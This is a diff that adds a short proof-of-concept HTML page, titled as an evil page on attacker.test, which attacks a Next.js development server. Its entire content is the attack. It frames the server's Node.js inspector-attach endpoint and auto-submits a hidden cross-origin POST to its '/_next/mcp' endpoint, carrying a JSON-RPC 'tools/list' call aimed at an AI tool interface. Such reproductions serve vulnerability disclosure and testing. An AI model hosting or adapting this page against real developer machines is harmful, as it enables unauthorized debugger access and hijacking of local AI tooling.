@@ -1,0 +1,12 @@
+<!doctype html>
+<html><body>
+<h1>evil page on attacker.test</h1>
+<iframe src="http://victimdev.test:3021/__nextjs_attach-nodejs-inspector" style="width:400px;height:200px;border:2px solid red"></iframe>
+<form id="f" method="POST" action="http://victimdev.test:3021/_next/mcp" target="mcpframe">
+  <input type="hidden" name="jsonrpc" value='{"jsonrpc":"2.0","method":"tools/list","id":1}'>
+</form>
+<iframe name="mcpframe" style="width:400px;height:200px;border:2px solid blue"></iframe>
+<script>
+document.getElementById('f').submit();
+</script>
+</body></html>
